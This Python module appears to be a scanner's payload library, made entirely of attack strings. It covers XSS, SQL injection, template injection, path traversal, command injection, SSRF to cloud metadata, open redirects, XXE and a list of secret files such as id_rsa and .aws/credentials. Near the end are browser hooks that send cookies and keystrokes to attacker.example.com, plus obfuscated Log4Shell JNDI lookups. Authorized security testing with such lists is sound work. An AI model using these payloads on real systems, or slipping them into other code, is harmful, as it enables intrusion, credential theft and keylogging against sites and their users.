"""Payload libraries for vulnerability probing."""
XSS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'><svg/onload=alert(1)>",
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '"><svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><iframe src=javascript:alert(1)>',
]

SQLI = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "1; SELECT SLEEP(3)--",
    "' AND SLEEP(3)--",
    "1' WAITFOR DELAY '0:0:3'--",
]

SSTI = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${{7*7}}",
    "{7*7}",
    "@(7*7)",
]

TRAVERSAL = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
]

CMDI = [
    "; id",
    "| id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "&& whoami",
    "\n id",
    "; cat /etc/passwd",
]

SSRF = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://[::1]/",
    "file:///etc/passwd",
    "http://0.0.0.0/",
    "http://127.1/",
]

REDIRECT = [
    "https://evil.example.com",
    "//evil.example.com",
    "https:evil.example.com",
    "/\\evil.example.com",
    "https://example.com@evil.example.com",
    "https://evil.example.com/%2f..",
]

XXE = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""

OPEN_REDIRECT_PARAMS = ["next", "url", "redirect", "return", "returnUrl", "return_url", "goto", "target", "dest", "destination", "redir", "redirect_uri", "continue", "forward", "to", "out", "view", "link"]

SENSITIVE_FILES = [
    ".env", ".git/config", ".git/HEAD", "config.php", "wp-config.php", "web.config",
    "robots.txt", "sitemap.xml", ".htaccess", "composer.json", "package.json",
    "backup.zip", "backup.sql", "db.sql", "dump.sql", "config.yml", "config.yaml",
    "application.properties", "application.yml", "secrets.yml", "id_rsa",
    ".aws/credentials", "phpinfo.php", "info.php", "server-status", "actuator",
    "actuator/env", "actuator/health", "metrics", "swagger.json", "openapi.json",
    "api-docs", "graphql", ".DS_Store", "crossdomain.xml", "clientaccesspolicy.xml",
]


# Advanced / MitB payloads
MITB_HOOKS = [
    "<script src='http://attacker.example.com/hook.js'></script>",
    "<script>document.onkeypress=e=>fetch('http://attacker.example.com/k?k='+e.key)</script>",
    "<script>fetch('http://attacker.example.com/s?c='+document.cookie)</script>",
]

JNDI_PAYLOADS = [
    "${jndi:ldap://attacker.example.com/a}",
    "${jndi:rmi://attacker.example.com/a}",
    "${jndi:dns://attacker.example.com}",
    "${${lower:j}ndi:${lower:l}dap://attacker.example.com/a}",
]
